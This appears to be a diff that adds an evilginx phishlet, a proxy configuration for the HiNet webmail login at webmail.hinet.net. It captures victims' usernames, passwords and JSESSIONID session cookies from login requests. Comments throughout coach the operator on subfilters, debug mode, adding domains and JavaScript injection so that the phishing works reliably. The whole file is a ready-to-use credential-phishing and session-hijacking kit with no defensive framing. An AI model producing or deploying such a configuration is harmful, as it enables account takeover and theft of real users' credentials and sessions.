@@ -1,0 +1,46 @@
+# LEARN TO USE --debug mode and --developer mode in evilginx.
+
+name: 'HinetWebmail'
+author: '@syriangeneral2'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'webmail.hinet.net', session: true, is_landing: true}
+
+# TRY TO ADD MORE DOMAINS/SUBDOMAINS IF THEY ARE PRESENT DURING SITE LOADING (CHECK NETWORK TAB IN DEVELOPERS TOOLS)
+  
+sub_filters: []
+
+# LEARN TO USE SUBFILTERS (DON'T DEPEND ON AUTOFILTER BY EVILGINX)
+
+# WITHOUT SUB FILTERS SOMETIMES THE USER CAN REDIRECT TO ORIGINAL DOMAINS/SUBDOMAINS , SO USE THE SUBFILTERS CAREFULLY
+
+#CHECK THESE AIRBNB FILTERS....
+
+#  - {triggers_on: 'www.airbnb.co.uk', orig_sub: 'www', domain: 'airbnb.co.uk', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+#  - {triggers_on: 'www.airbnb.co.uk', orig_sub: 'www', domain: 'airbnb.co.uk', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+#  - {triggers_on: 'www.airbnb.co.uk', orig_sub: 'www', domain: 'airbnb.co.uk', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript', 'multipart/form-data']}
+
+  
+auth_tokens:
+  - domain: 'webmail.hinet.net' #CHECK ON OFFICIAL WIKI , HOW TO USE AUTH TOKENS TO GRAB ALL NECCESAARY TOKENS.
+    keys: ['JSESSIONID(.*),regexp']
+
+credentials:
+  username:
+    key: 'mailid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+# HERE YOU CAN ALSO ADD SOME CUSTOM FIELD TO CAPTURE FROM REQUESTS CHECK WIKI TO SEE HOW TO DO THAT
+login:
+  domain: 'webmail.hinet.net'
+  path: '/index.html'
+  
+#LEARN TO USE JAVASCRIPT INJECTION AS WELL
+
+
+
+  
